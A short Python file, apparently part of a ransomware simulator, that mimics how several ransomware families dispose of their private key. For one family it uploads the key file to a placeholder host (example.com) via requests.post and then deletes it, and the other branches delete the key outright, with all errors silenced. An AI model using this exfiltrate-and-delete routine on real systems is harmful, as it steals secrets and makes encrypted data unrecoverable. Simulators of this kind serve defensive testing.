import os
import requests
from cryptography.hazmat.primitives import serialization

# Path to the private key file
private_key_path = r"D:\Cyber\Malware\Ransomware_Simulator\Ransim\private_key.pem"

def hide_private_key(ransomware):
    try:
        if ransomware == 'Black Basta':
            # Exfiltration: Send the private key to a remote server
            url = "http://example.com/upload"  # Replace with actual URL for key exfiltration
            with open(private_key_path, 'rb') as f:
                files = {'file': f}
                try:
                    requests.post(url, files=files)
                finally:
                    os.remove(private_key_path)  # Delete the key file after exfiltration

        elif ransomware == 'Play':
            # Memory-only storage: Delete private key file immediately after use
            with open(private_key_path, 'rb') as f:
                private_key = f.read()
            os.remove(private_key_path)  # Private key now only in memory

        elif ransomware == 'Wannacry':
            # Remote server communication (simulated)
            # Simulate by removing the private key file
            os.remove(private_key_path)

        elif ransomware == 'LockBit':
            # Exfiltration with advanced obfuscation (simulated)
            # Simulate by removing the private key file after pretending to obfuscate it
            os.remove(private_key_path)

        else:
            os.remove(private_key_path)  # If no specific method is defined, just delete the file

    except Exception:
        pass  # Silence all exceptions to avoid raising errors during ransomware simulation

# Example usage:
if __name__ == "__main__":
    ransomware = "Black Basta"  # Replace with the ransomware type chosen by the user
    hide_private_key(ransomware)
